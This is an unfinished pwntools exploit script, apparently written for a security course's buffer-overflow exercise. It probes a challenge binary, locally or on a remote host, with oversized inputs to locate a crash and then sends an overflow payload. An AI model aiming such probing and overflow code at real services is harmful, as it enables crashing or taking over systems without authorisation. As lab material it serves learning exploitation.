from pwn import *
import sys

# Buffer size is not 16 on the server
LOCAL_BUFF_SIZE = 16
ACTUAL_BUFF_SIZE = 16


def recon(argv=[], *a, **kwargs):
    buff_size = LOCAL_BUFF_SIZE
    i = 0
    # We don't know the actual buff size sp we must find it and crash the server
    while i < 3:
        try:
            with remote(sys.argv[1], sys.argv[2], *a, **kwargs) as conn:
                warn(conn.recvline(2))
                print(f"Sending 0x{buff_size:0x} bytes")
                conn.send(b"B" * buff_size + b"\x07" + b"\x0a")
                warn(conn.recvall())
                # buff_size *= 2
        except Exception as e:
            print(e)
            print(f"System crash at 0x{buff_size:0x} bytes")
            return buff_size

        i += 1


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
break *0x08049333
break *0x0804930d
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/usingFGets/challenge"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "DEBUG"

# Run the debugger

# We first need to cause the stack to crash
# Create a loop until we encounter "YOu're not the messiah!"
buffsize = LOCAL_BUFF_SIZE
if args.REMOTE:
    buffsize = recon()
else:
    buffsize = LOCAL_BUFF_SIZE

# exit(1)
io = start()
io.recvline(2)
try:
    payload = (buffsize) * b"A" + b"B"
    io.sendline(payload)
    result = io.recvall()
    print(result)
except Exception as e:
    print(e)
# Add the canary below but into little endian form


# sys.stdout.buffer.write(16 * b"A" + b"\xff")
